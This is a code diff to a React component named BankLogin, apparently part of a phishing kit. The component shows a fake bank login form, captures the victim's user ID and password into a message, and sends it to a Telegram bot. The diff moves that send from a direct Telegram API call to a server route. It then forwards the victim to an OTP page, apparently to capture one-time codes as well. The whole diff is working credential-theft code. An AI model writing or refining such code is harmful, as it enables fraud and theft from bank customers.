@@ -8,17 +8,6 @@ export default function BankLogin({ bankName }: { bankName: string }) {
   const [password, setPassword] = useState('');
   const router = useRouter();
 
-  const sendToTelegram = async (text: string) => {
-    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: process.env.TELEGRAM_CHAT_ID,
-        text,
-      }),
-    });
-  };
-
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
@@ -28,8 +17,18 @@ export default function BankLogin({ bankName }: { bankName: string }) {
 🔒 Password: ${password}
     `.trim();
 
-    await sendToTelegram(message);
-    router.push(`/otp?bank=${encodeURIComponent(bankName)}&user=${encodeURIComponent(userId)}`);
+    try {
+      await fetch('/api/send-telegram', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ text: message }),
+      });
+
+      router.push(`/otp?bank=${encodeURIComponent(bankName)}&user=${encodeURIComponent(userId)}`);
+    } catch (err) {
+      console.error('Telegram error:', err);
+      alert('❌ Failed to send data to Telegram.');
+    }
   };
 
   return (
